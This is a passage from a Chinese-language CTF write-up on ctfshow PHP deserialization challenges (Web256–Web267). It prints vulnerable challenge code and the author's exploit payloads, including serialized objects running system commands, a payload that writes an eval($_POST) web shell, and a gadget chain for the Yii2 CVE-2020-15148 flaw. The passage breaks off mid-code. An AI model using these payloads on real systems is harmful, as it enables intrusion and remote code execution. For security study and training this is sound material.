variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>逻辑很清晰，只比上一题多了$this-&gt;username!==$this-&gt;password这东西确实不难。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//url编码防止忽略不可见字符</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Web257"><a href="#Web257" class="headerlink" title="Web257"></a>Web257</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">-></span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$user</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">user</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">backDoor</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一题的解法还挺多的，主要是利用<code>__construct()</code>函数 </p><h3 id="Web258"><a href="#Web258" class="headerlink" title="Web258"></a>Web258</h3><p>这一题目只有比上一问多过滤了一段过滤</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A0%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A25%3A%22system%28%22tac+.%2Fflag.php%22%29%3B%22%3B%7D%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Web259"><a href="#Web259" class="headerlink" title="Web259"></a>Web259</h3><p>暂时还没出……..</p><h3 id="Web260"><a href="#Web260" class="headerlink" title="Web260"></a>Web260</h3><p>这个难道不是把那个36D杯的题目直接搬来了？</p><pre class="line-numbers language-none"><code class="language-none">?ctfshow&#x3D;ctfshow_i_love_36D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Web261"><a href="#Web261" class="headerlink" title="Web261"></a>Web261</h3><blockquote><p><strong>unserialize()</strong> 函数用于将通过serialize()函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。</p></blockquote><p><strong>题目源码：</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshowvip</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">!=</span><span class="token string single-quoted-string">''</span> <span class="token operator">||</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">!=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$this-&gt;code==0x36d是这里考察的是PHP弱类型比较，0x36d没有引号代表数字，十六进制0x36d转为十进制是877，因为弱比较，实际上877.php这样一样可以通过判断。</p><p>同时<a href="https://www.runoob.com/php/func-filesystem-file-put-contents.html">file_put_contents()</a>函数，这也给我们传一句话木马的机会，这里我就不多解释，直接看菜鸟教程吧</p><p>另外如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法， 则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。 </p><p>我们就可以这样构造</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshowvip</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token string single-quoted-string">'877.php'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token string single-quoted-string">'&lt;?php eval($_POST[a]);?>'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfshowvip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看下877.php有没有成功传入，发现成功传入后直接操纵一句话木马得到flag。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">a<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat /f*"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Web262"><a href="#Web262" class="headerlink" title="Web262"></a>Web262</h3><blockquote><p> str_replace(‘fuck’, ‘loveU’, serialize($msg)) 因为前后用于替换的文本长度不一致导致的字符串逃逸漏洞</p></blockquote><p>注释里有一个 <strong>@message.php</strong>这玩意 </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">==</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>题目源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">from</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">msg</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">to</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$m</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$t</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'t'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">message</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$umsg</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fuck'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'loveU'</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">,</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$umsg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your message has been sent'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将需要逃逸的内容构造一下:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span>admin<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>O:7:”message”:1:{s:5:”token”;s:5:”admin”;}这一串，实际上我们需要传进去的只有 s:5:”token”;s:5:”admin”; 加上闭合<code>&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code>一共27个字符，每次替换增加一个字符，需要27个fuck吃掉构造函数的<code>$token=&#39;user&#39;;</code> </p><p>之后在访问message.php，即可</p><h3 id="Web264"><a href="#Web264" class="headerlink" title="Web264"></a>Web264</h3><h3 id="Web267"><a href="#Web267" class="headerlink" title="Web267"></a>Web267</h3><p>从这道题之后的内容考察的是Yii的框架漏洞，**Yii2 反序列化漏洞(CVE-2020-15148)**， Yii2 2.0.38 之前的版本存在反序列化漏洞，程序在调用unserialize 时，攻击者可通过构造特定的恶意请求执行任意命令。 </p><p>关于这个漏洞可以看这个文章<a href="https://blog.csdn.net/xuandao_ahfengren/article/details/111259943">Yii2 反序列化漏洞(CVE-2020-15148)复现</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">CreateAction</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>         <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>CreateAction</span><span class="token punctuation">;</span>     <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>         <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'close'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">CreateAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>     <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>         <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 